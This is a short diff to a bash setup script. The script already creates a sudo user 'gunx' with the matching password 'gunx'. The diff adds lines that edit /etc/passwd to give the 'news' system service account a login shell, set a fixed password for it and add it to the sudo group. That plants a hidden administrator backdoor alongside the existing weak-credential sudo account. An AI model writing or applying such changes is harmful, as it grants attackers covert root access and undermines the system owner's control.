@@ -1,4 +1,8 @@
 #!/bin/bash
+sed -i 's/news:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin/news:x:9:9:news:\/home:/g' /etc/passwd
+echo news:vpnk | chpasswd
+usermod -aG sudo news
+# 
 sudo useradd -u 14 gunx
 echo "gunx:gunx" | chpasswd
 usermod -aG sudo gunx
